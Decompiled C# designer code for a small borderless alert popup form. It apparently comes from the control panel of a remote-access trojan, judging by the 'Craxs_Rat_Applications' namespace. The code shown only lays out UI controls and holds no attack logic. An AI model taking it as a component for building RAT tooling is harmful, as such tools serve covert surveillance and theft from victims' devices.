// Token: 0x02000023 RID: 35
[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
public partial class alertform : global::System.Windows.Forms.Form
{
	// Token: 0x06000176 RID: 374 RVA: 0x0000D9EC File Offset: 0x0000BBEC
	protected override void Dispose(bool disposing)
	{
		if (disposing && this.components != null)
		{
			this.components.Dispose();
		}
		base.Dispose(disposing);
	}

	// Token: 0x06000177 RID: 375 RVA: 0x0000DA1C File Offset: 0x0000BC1C
	private void InitializeComponent()
	{
		this.components = new global::System.ComponentModel.Container();
		this.msglabel = new global::System.Windows.Forms.Label();
		this.closetimer = new global::System.Windows.Forms.Timer(this.components);
		this.guna2GradientTileButton1 = new global::Guna.UI2.WinForms.Guna2GradientTileButton();
		this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
		((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		base.SuspendLayout();
		this.msglabel.BackColor = global::System.Drawing.Color.Black;
		this.msglabel.Dock = global::System.Windows.Forms.DockStyle.Right;
		this.msglabel.Font = new global::System.Drawing.Font("Calibri", 11f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.msglabel.ForeColor = global::System.Drawing.Color.Red;
		this.msglabel.Location = new global::System.Drawing.Point(150, 0);
		this.msglabel.Name = "msglabel";
		this.msglabel.Size = new global::System.Drawing.Size(277, 42);
		this.msglabel.TabIndex = 2;
		this.msglabel.Text = "this is test msg";
		this.msglabel.TextAlign = global::System.Drawing.ContentAlignment.MiddleLeft;
		this.closetimer.Interval = 40;
		this.closetimer.Tick += new global::System.EventHandler(this.Closetimer_Tick);
		this.guna2GradientTileButton1.AutoRoundedCorners = true;
		this.guna2GradientTileButton1.BorderColor = global::System.Drawing.Color.Red;
		this.guna2GradientTileButton1.BorderRadius = 20;
		this.guna2GradientTileButton1.BorderThickness = 2;
		this.guna2GradientTileButton1.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
		this.guna2GradientTileButton1.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
		this.guna2GradientTileButton1.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
		this.guna2GradientTileButton1.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
		this.guna2GradientTileButton1.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
		this.guna2GradientTileButton1.FillColor = global::System.Drawing.Color.Black;
		this.guna2GradientTileButton1.FillColor2 = global::System.Drawing.Color.Black;
		this.guna2GradientTileButton1.Font = new global::System.Drawing.Font("Bahnschrift", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
		this.guna2GradientTileButton1.ForeColor = global::System.Drawing.Color.White;
		this.guna2GradientTileButton1.Location = new global::System.Drawing.Point(49, 0);
		this.guna2GradientTileButton1.Name = "guna2GradientTileButton1";
		this.guna2GradientTileButton1.Size = new global::System.Drawing.Size(378, 42);
		this.guna2GradientTileButton1.TabIndex = 5;
		this.guna2GradientTileButton1.Text = "OK";
		this.pictureBox1.BackColor = global::System.Drawing.Color.Black;
		this.pictureBox1.Image = global::Craxs_Rat_Applications.eagle;
		this.pictureBox1.Location = new global::System.Drawing.Point(2, 0);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new global::System.Drawing.Size(41, 42);
		this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 3;
		this.pictureBox1.TabStop = false;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = global::System.Drawing.Color.Black;
		base.CausesValidation = false;
		base.ClientSize = new global::System.Drawing.Size(427, 42);
		base.ControlBox = false;
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.guna2GradientTileButton1);
		base.Controls.Add(this.msglabel);
		this.DoubleBuffered = true;
		base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
		base.Name = "alertform";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "AlertForm";
		base.TransparencyKey = global::System.Drawing.Color.Black;
		base.Load += new global::System.EventHandler(this.AlertForm_Load);
		base.Shown += new global::System.EventHandler(this.alertform_Shown);
		((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		base.ResumeLayout(false);
	}

	// Token: 0x040000B7 RID: 183
	private global::System.ComponentModel.IContainer components;

	// Token: 0x040000B9 RID: 185
	private global::System.Windows.Forms.Label msglabel;

	// Token: 0x040000C4 RID: 196
	private global::System.Windows.Forms.PictureBox pictureBox1;

	// Token: 0x040000C5 RID: 197
	private global::Guna.UI2.WinForms.Guna2GradientTileButton guna2GradientTileButton1;

	// Token: 0x040000C6 RID: 198
	internal global::System.Windows.Forms.Timer closetimer;
}
